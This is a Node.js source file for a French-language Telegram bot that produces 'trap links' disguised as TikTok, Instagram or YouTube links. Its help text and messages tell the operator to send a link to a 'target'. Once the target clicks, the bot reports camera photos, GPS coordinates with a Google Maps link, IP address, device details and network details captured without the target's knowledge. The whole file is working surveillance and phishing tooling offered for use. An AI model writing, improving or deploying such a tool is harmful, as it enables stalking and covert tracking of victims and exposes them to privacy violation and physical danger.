const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");

// Configuration propre
dotenv.config();

// Réduire les logs verbeux TLS
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

// Filtrer les logs encombrants
const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(' ');
    if (message.includes('TLSWrap') || message.includes('Symbol(') || message.includes('kBuffer')) {
        return; // Ignorer les logs TLS verbeux
    }
    originalLog.apply(console, args);
};

// Initialisation du bot
const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ TELEGRAM_BOT_TOKEN manquant dans les Secrets !');
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });

// URL de base simplifiée
const BASE_URL = process.env.REPLIT_DOMAINS
    ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
    : `http://localhost:${process.env.PORT || 5000}`;

console.log(`🤖 Bot Telegram démarré !`);
console.log(`📡 URL de base: ${BASE_URL}`);

// 🎯 COMMANDE /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcome = `🔥 **Bot de Capture de Données Activé !**

🎯 **Commandes disponibles :**
• /generate - Créer un lien piège
• /data [ID] - Voir les données capturées
• /help - Aide

🚀 **Prêt à capturer !**`;

    bot.sendMessage(chatId, welcome, { parse_mode: "Markdown" });
});

// 🎯 COMMANDE /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const help = `📚 **Guide d'utilisation :**

🔗 **Créer un lien :**
1. Tape /generate
2. Choisis une plateforme
3. Partage le lien généré

📊 **Voir les données :**
1. Tape /data [ID]
2. Ou clique sur le lien dans le message

✨ **Le bot capture automatiquement :**
• 📸 Photos haute résolution
• 📍 Géolocalisation GPS + IP
• 📱 Infos complètes de l'appareil
• 🌐 Données réseau et navigateur`;

    bot.sendMessage(chatId, help, { parse_mode: "Markdown" });
});

// 🎯 GÉNÉRATION DE LIENS
bot.onText(/\/generate/, (msg) => {
    const chatId = msg.chat.id;

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🎵 TikTok", callback_data: "tiktok" },
                    { text: "📸 Instagram", callback_data: "instagram" }
                ],
                [
                    { text: "📺 YouTube", callback_data: "youtube" }
                ]
            ]
        },
        parse_mode: "Markdown"
    };

    bot.sendMessage(chatId, "🎯 **Choisis ta plateforme :**", keyboard);
});

// 🎯 GESTION DES BOUTONS (CALLBACK QUERIES)
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const platform = query.data;

    // Répondre immédiatement au callback pour éviter les timeouts
    bot.answerCallbackQuery(query.id).catch(() => {}); // Ignorer les erreurs silencieusement

    try {
        // Générer le lien
        const response = await axios.post(`${BASE_URL}/generate-link`, {
            platform,
            chatId
        });

        const { id, url } = response.data;

        const platformEmojis = {
            tiktok: "🎵",
            instagram: "📸",
            youtube: "📺"
        };

        const message = `${platformEmojis[platform]} **${platform.toUpperCase()} - Lien Généré !**

🔗 **Lien piège :**
\`${url}\`

🆔 **ID de suivi :** \`${id}\`

📊 **Voir les données :** /data ${id}

🎯 **Instructions :**
1. Partage ce lien à ta cible
2. Quand elle clique, les données sont capturées automatiquement
3. Utilise /data ${id} pour voir les résultats

⚡ **Statut :** Actif et prêt à capturer !`;

        bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

        console.log(`🔗 Lien ${platform} généré: ${id} pour chat ${chatId}`);

    } catch (error) {
        console.error("❌ Erreur génération lien:", error.message);
        bot.sendMessage(chatId, "❌ Erreur lors de la génération. Réessaye dans quelques secondes.");
    }
});

// 🎯 COMMANDE /data [ID]
bot.onText(/\/data (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const linkId = match[1].trim();

    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`);
        const data = response.data;

        // Construire le message de résultats
        let message = `📊 **DONNÉES CAPTURÉES - ${linkId}**\n\n`;

        // 📸 Photos
        if (data.images && data.images.length > 0) {
            message += `📸 **Photos :** ${data.images.length} images capturées\n`;
            message += `📐 **Résolution :** Haute qualité (jusqu'à 1920x1080)\n\n`;
        } else {
            message += `📸 **Photos :** Aucune image capturée\n\n`;
        }

        // 📍 Localisation
        if (data.location && data.location.latitude) {
            message += `📍 **Géolocalisation :**\n`;
            message += `• Lat: ${data.location.latitude}\n`;
            message += `• Lng: ${data.location.longitude}\n`;
            message += `• Précision: ${data.location.accuracy || 'N/A'}m\n`;
            if (data.location.city) {
                message += `• Ville: ${data.location.city}\n`;
            }
            if (data.location.country) {
                message += `• Pays: ${data.location.country}\n`;
            }
            message += `• Source: ${data.location.source}\n\n`;
        } else {
            message += `📍 **Géolocalisation :** Non disponible\n\n`;
        }

        // 📱 Appareil
        if (data.device) {
            message += `📱 **Appareil :**\n`;
            if (data.device.platform) {
                message += `• OS: ${data.device.platform}\n`;
            }
            if (data.device.screen) {
                message += `• Écran: ${data.device.screen.width}x${data.device.screen.height}\n`;
            }
            if (data.device.language) {
                message += `• Langue: ${data.device.language}\n`;
            }
            message += '\n';
        }

        // 🌐 Réseau
        if (data.network && data.network.effectiveType) {
            message += `🌐 **Réseau :**\n`;
            message += `• Type: ${data.network.effectiveType}\n`;
            if (data.network.downlink) {
                message += `• Vitesse: ${data.network.downlink} Mbps\n`;
            }
            message += '\n';
        }

        // ⏰ Timestamp
        message += `⏰ **Capturé le :** ${new Date(data.timestamp).toLocaleString('fr-FR')}\n`;
        message += `🌐 **IP :** ${data.ip || 'N/A'}`;

        // Envoyer le message principal
        bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

        // Envoyer la première photo si disponible
        if (data.images && data.images.length > 0) {
            try {
                const imageBuffer = Buffer.from(data.images[0], 'base64');
                await bot.sendPhoto(chatId, imageBuffer, {
                    caption: `📸 Photo 1/${data.images.length} capturée via ${linkId}`
                });

                if (data.images.length > 1) {
                    bot.sendMessage(chatId,
                        `📸 **${data.images.length - 1} autres photos disponibles !**\n\n` +
                        `Pour voir toutes les photos, utilise le panneau d'administration ou contacte le développeur.`,
                        { parse_mode: "Markdown" }
                    );
                }
            } catch (photoError) {
                console.error("❌ Erreur envoi photo:", photoError.message);
                bot.sendMessage(chatId, `📸 ${data.images.length} photos capturées (erreur d'affichage)`);
            }
        }

        // Lien Google Maps si géolocalisation disponible
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(chatId,
                `🗺️ **[Voir sur Google Maps](${mapsUrl})**`,
                { parse_mode: "Markdown", disable_web_page_preview: false }
            );
        }

        console.log(`📊 Données consultées pour ${linkId} par chat ${chatId}`);

    } catch (error) {
        if (error.response && error.response.status === 404) {
            bot.sendMessage(chatId,
                `❌ **Aucune donnée trouvée pour l'ID :** \`${linkId}\`\n\n` +
                `💡 **Vérifications :**\n` +
                `• L'ID est-il correct ?\n` +
                `• Quelqu'un a-t-il cliqué sur le lien ?\n` +
                `• Le lien a-t-il été généré récemment ?`,
                { parse_mode: "Markdown" }
            );
        } else {
            console.error("❌ Erreur récupération données:", error.message);
            bot.sendMessage(chatId, "❌ Erreur lors de la récupération des données. Réessaye plus tard.");
        }
    }
});

// 🎯 GESTION DES ERREURS GLOBALES
bot.on('polling_error', (error) => {
    console.error('❌ Erreur polling:', error.message);
});

bot.on('webhook_error', (error) => {
    console.error('❌ Erreur webhook:', error.message);
});

// Message de confirmation
console.log('✅ Bot Telegram prêt et en écoute !');
